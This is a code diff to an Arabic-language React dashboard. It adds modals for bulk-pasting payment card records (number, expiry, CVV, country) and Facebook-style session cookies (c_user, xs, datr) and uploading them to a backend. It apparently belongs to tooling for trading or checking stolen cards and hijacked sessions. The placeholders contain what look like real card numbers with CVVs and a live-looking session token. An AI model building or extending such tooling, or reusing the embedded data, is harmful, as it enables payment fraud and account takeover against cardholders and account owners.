@@ -26,6 +26,10 @@ export default function Dashboard() {
   const [error, setError] = useState<string | null>(null);
   const [uploading, setUploading] = useState(false);
   const [message, setMessage] = useState<string | null>(null);
+  const [showCardsInput, setShowCardsInput] = useState(false);
+  const [showCookiesInput, setShowCookiesInput] = useState(false);
+  const [cardsText, setCardsText] = useState('');
+  const [cookiesText, setCookiesText] = useState('');
 
   const cardsFileRef = useRef<HTMLInputElement>(null);
   const cookiesFileRef = useRef<HTMLInputElement>(null);
@@ -84,12 +88,98 @@ export default function Dashboard() {
       formData.append('file', file);
 
       const response = await apiClient.post(endpoint, formData);
-
       const result = response as { inserted: number };
       setMessage(`تم رفع ${type} بنجاح! تم إضافة ${result.inserted} عنصر.`);
       fetchStats(); // Refresh stats
     } catch (err) {
       setError(err instanceof Error ? err.message : `فشل رفع ${type}`);
+    } finally {
+      setUploading(false);
+    }
+  };
+
+  const uploadCardsText = async () => {
+    try {
+      setUploading(true);
+      setMessage(null);
+      setError(null);
+
+      // Parse cards text
+      const lines = cardsText.trim().split('\n').filter(line => line.trim());
+      const cards = lines.map(line => {
+        const parts = line.split('|');
+        if (parts.length >= 4) {
+          return {
+            number: parts[0].trim(),
+            exp_month: parts[1].trim(),
+            exp_year: parts[2].trim(),
+            cvv: parts[3].trim(),
+            country: parts[4]?.trim() || 'US'
+          };
+        }
+        return null;
+      }).filter(card => card !== null);
+
+      if (cards.length === 0) {
+        setError('لم يتم العثور على بطاقات صحيحة في النص');
+        return;
+      }
+
+      const response = await apiClient.post('/api/upload/cards/json', cards);
+      const result = response as { inserted: number };
+      setMessage(`تم رفع ${cards.length} بطاقة بنجاح!`);
+      setCardsText('');
+      setShowCardsInput(false);
+      fetchStats();
+    } catch (err) {
+      setError(err instanceof Error ? err.message : 'فشل رفع البطاقات');
+    } finally {
+      setUploading(false);
+    }
+  };
+
+  const uploadCookiesText = async () => {
+    try {
+      setUploading(true);
+      setMessage(null);
+      setError(null);
+
+      // Parse cookies text
+      const lines = cookiesText.trim().split('\n').filter(line => line.trim());
+      const cookies = lines.map(line => {
+        // Parse cookie string like: dpr=1.25; datr=9uZ-aLwoegltfChjgu-Fp0DH; c_user=61576495205670; xs=39%3ANcSkc6sIF__heg%3A2%3A1753147138%3A-1%3A-1%3A%3AAcWWXmk0z_J0BqPXOqqhSEtEuPr6QhUevQzrIpZ8cA
+        const cookieObj: any = {};
+        const pairs = line.split(';');
+        
+        pairs.forEach(pair => {
+          const [key, value] = pair.trim().split('=');
+          if (key && value) {
+            cookieObj[key.trim()] = value.trim();
+          }
+        });
+
+        return {
+          c_user: cookieObj.c_user || '',
+          xs: cookieObj.xs || '',
+          fr: cookieObj.fr || '',
+          datr: cookieObj.datr || '',
+          country: cookieObj.country || 'US'
+        };
+      }).filter(cookie => cookie.c_user && cookie.xs);
+
+      if (cookies.length === 0) {
+        setError('لم يتم العثور على كوكيز صحيحة في النص');
+        return;
+      }
+
+      const response = await apiClient.post('/api/upload/cookies/json', cookies);
+      const result = response as { inserted: number };
+      setMessage(`تم رفع ${cookies.length} كوكيز بنجاح!`);
+      setCookiesText('');
+      setShowCookiesInput(false);
+      fetchStats();
+    } catch (err) {
+      setError(err instanceof Error ? err.message : 'فشل رفع الكوكيز');
     } finally {
       setUploading(false);
     }
@@ -251,23 +341,100 @@ export default function Dashboard() {
           </div>
         )}
 
+        {/* Cards Input Modal */}
+        {showCardsInput && (
+          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
+            <div className="bg-white rounded-lg p-6 w-full max-w-2xl max-h-[80vh] overflow-y-auto">
+              <h3 className="text-xl font-semibold text-gray-800 mb-4">إدخال البطاقات</h3>
+              <p className="text-gray-600 mb-4">
+                أدخل البطاقات بالشكل التالي: رقم_البطاقة|الشهر|السنة|CVV|البلد(اختياري)
+              </p>
+              <textarea
+                value={cardsText}
+                onChange={(e) => setCardsText(e.target.value)}
+                placeholder="6259693800226810|03|2029|108
+6259693800224484|03|2029|118
+6259693800227867|03|2029|453"
+                className="w-full h-64 p-3 border border-gray-300 rounded-md font-mono text-sm"
+              />
+              <div className="flex gap-2 mt-4">
+                <button
+                  onClick={uploadCardsText}
+                  disabled={uploading || !cardsText.trim()}
+                  className="bg-blue-600 hover:bg-blue-700 disabled:bg-gray-400 text-white font-medium py-2 px-4 rounded-md transition-colors"
+                >
+                  {uploading ? 'جاري الرفع...' : 'رفع البطاقات'}
+                </button>
+                <button
+                  onClick={() => setShowCardsInput(false)}
+                  className="bg-gray-600 hover:bg-gray-700 text-white font-medium py-2 px-4 rounded-md transition-colors"
+                >
+                  إلغاء
+                </button>
+              </div>
+            </div>
+          </div>
+        )}
+
+        {/* Cookies Input Modal */}
+        {showCookiesInput && (
+          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
+            <div className="bg-white rounded-lg p-6 w-full max-w-2xl max-h-[80vh] overflow-y-auto">
+              <h3 className="text-xl font-semibold text-gray-800 mb-4">إدخال الكوكيز</h3>
+              <p className="text-gray-600 mb-4">
+                أدخل الكوكيز بالشكل التالي: dpr=1.25; datr=9uZ-aLwoegltfChjgu-Fp0DH; c_user=61576495205670; xs=39%3ANcSkc6sIF__heg%3A2%3A1753147138%3A-1%3A-1%3A%3AAcWWXmk0z_J0BqPXOqqhSEtEuPr6QhUevQzrIpZ8cA
+              </p>
+              <textarea
+                value={cookiesText}
+                onChange={(e) => setCookiesText(e.target.value)}
+                placeholder="dpr=1.25; datr=9uZ-aLwoegltfChjgu-Fp0DH; c_user=61576495205670; xs=39%3ANcSkc6sIF__heg%3A2%3A1753147138%3A-1%3A-1%3A%3AAcWWXmk0z_J0BqPXOqqhSEtEuPr6QhUevQzrIpZ8cA"
+                className="w-full h-64 p-3 border border-gray-300 rounded-md font-mono text-sm"
+              />
+              <div className="flex gap-2 mt-4">
+                <button
+                  onClick={uploadCookiesText}
+                  disabled={uploading || !cookiesText.trim()}
+                  className="bg-green-600 hover:bg-green-700 disabled:bg-gray-400 text-white font-medium py-2 px-4 rounded-md transition-colors"
+                >
+                  {uploading ? 'جاري الرفع...' : 'رفع الكوكيز'}
+                </button>
+                <button
+                  onClick={() => setShowCookiesInput(false)}
+                  className="bg-gray-600 hover:bg-gray-700 text-white font-medium py-2 px-4 rounded-md transition-colors"
+                >
+                  إلغاء
+                </button>
+              </div>
+            </div>
+          </div>
+        )}
+
         {/* Quick Actions */}
         <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-8">
           <div className="bg-white rounded-lg shadow-lg p-6">
             <div className="text-blue-600 text-3xl mb-4">📤</div>
             <h3 className="text-xl font-semibold text-gray-800 mb-2">رفع البطاقات</h3>
-            <p className="text-gray-600 mb-4">رفع ملف CSV يحتوي على بيانات البطاقات</p>
-            <button 
-              onClick={handleUploadCards}
-              disabled={uploading}
-              className="bg-blue-600 hover:bg-blue-700 disabled:bg-gray-400 text-white font-medium py-2 px-4 rounded-md transition-colors"
-            >
-              {uploading ? 'جاري الرفع...' : 'رفع البطاقات'}
-            </button>
+            <p className="text-gray-600 mb-4">رفع ملف CSV أو إدخال البطاقات مباشرة</p>
+            <div className="flex gap-2">
+              <button 
+                onClick={() => setShowCardsInput(true)}
+                disabled={uploading}
+                className="bg-blue-600 hover:bg-blue-700 disabled:bg-gray-400 text-white font-medium py-2 px-4 rounded-md transition-colors"
+              >
+                إدخال مباشر
+              </button>
+              <button 
+                onClick={handleUploadCards}
+                disabled={uploading}
+                className="bg-blue-500 hover:bg-blue-600 disabled:bg-gray-400 text-white font-medium py-2 px-4 rounded-md transition-colors"
+              >
+                ملف CSV
+              </button>
+            </div>
             <input
               ref={cardsFileRef}
               type="file"
-              accept=".csv"
+              accept=".csv,.txt"
               onChange={handleCardsFileChange}
               className="hidden"
             />
@@ -276,18 +443,27 @@ export default function Dashboard() {
           <div className="bg-white rounded-lg shadow-lg p-6">
             <div className="text-green-600 text-3xl mb-4">🍪</div>
             <h3 className="text-xl font-semibold text-gray-800 mb-2">رفع الكوكيز</h3>
-            <p className="text-gray-600 mb-4">رفع ملف CSV يحتوي على بيانات الكوكيز</p>
-            <button 
-              onClick={handleUploadCookies}
-              disabled={uploading}
-              className="bg-green-600 hover:bg-green-700 disabled:bg-gray-400 text-white font-medium py-2 px-4 rounded-md transition-colors"
-            >
-              {uploading ? 'جاري الرفع...' : 'رفع الكوكيز'}
-            </button>
+            <p className="text-gray-600 mb-4">رفع ملف CSV أو إدخال الكوكيز مباشرة</p>
+            <div className="flex gap-2">
+              <button 
+                onClick={() => setShowCookiesInput(true)}
+                disabled={uploading}
+                className="bg-green-600 hover:bg-green-700 disabled:bg-gray-400 text-white font-medium py-2 px-4 rounded-md transition-colors"
+              >
+                إدخال مباشر
+              </button>
+              <button 
+                onClick={handleUploadCookies}
+                disabled={uploading}
+                className="bg-green-500 hover:bg-green-600 disabled:bg-gray-400 text-white font-medium py-2 px-4 rounded-md transition-colors"
+              >
+                ملف CSV
+              </button>
+            </div>
             <input
               ref={cookiesFileRef}
               type="file"
-              accept=".csv"
+              accept=".csv,.txt"
               onChange={handleCookiesFileChange}
               className="hidden"
             />
